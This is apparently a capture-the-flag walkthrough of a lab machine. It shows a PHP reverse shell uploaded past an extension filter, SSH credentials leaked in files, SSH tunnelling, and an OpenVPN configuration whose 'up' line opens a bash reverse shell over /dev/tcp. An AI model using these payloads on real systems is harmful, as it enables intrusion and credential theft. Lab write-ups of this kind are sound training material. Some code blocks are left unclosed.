After few minutes of searching and guessing, you should arrive at this login page.

This page was giving access to a file upload module, but it had some extension restriction. Replacing the reverse PHP shell extension for `.php5` and that's it, you got access to the ubuntu host as `www-data`.

My first reflex was to check what services were reachable from the internal.

Note that local IP adress `192.168.122.1:53` is on another network.

Looking for something else, something like some broken files left on the desktop that would aloud you to pivote trough ssh! `#EPIC_FAIL`

```bash
cat key
itscominghome

cat /home/dave/Desktop/ssh
dave
Dav3therav3123

cat Servers 
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5

```


```
ssh -fNtD 9050 dave@10.10.10.109 [-L 127.0.0.1:8888:192.168.122.4:80]

This [medium article](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da) defines well what is what and how to pop a shell out of it!

```
remote 192.168.122.1
dev tun
nobind
script-security 2
up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/2323 0>&1'"
```

```
cat ssh

> At this point you could have change the root password and connect with ssh using these credentials and found alex's `.bash_history` where you would have seen that he was pinging the `192.168.5.2` IP adress. But no chance, this adress was no longuer reachable. 

All the traffic to the Vault was passing trough the  `192.168.122.5` firewall. Bypassing firewall was easy. All you had to do was to add another IP adress to the same interface and remove this routing. Then, running a basic nmap scan on this target to unveil the `987/tcp` port wich was exposing a ssh service that were using the same cred then the DNS box.

Welcome to the Vault!
=====================

To complete the box, you had to `scp` the `root.txt.gpg` back to the ubuntu box and pass the key `itscominghome`.

```
You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
      gpg: .srb: unknown suffix
      Enter new filename [root.txt]: root.txt

cat root.txt
